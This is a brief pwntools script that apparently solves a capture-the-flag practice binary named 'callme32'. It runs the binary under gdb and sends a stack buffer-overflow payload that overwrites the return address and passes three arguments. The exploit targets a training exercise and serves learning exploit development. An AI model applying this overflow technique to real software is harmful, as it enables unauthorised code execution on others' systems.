from pwn import *

context(os="linux",arch="i386",terminal=["tmux","new-window"])
#p = process("./callme32")
p = gdb.debug("./callme32","b usefulFunction")
p.recvuntil("> ")
p.sendline("A"*44+p32(0x804880c)+"AAAA"+p32(1)+p32(2)+p32(3))
p.interactive()
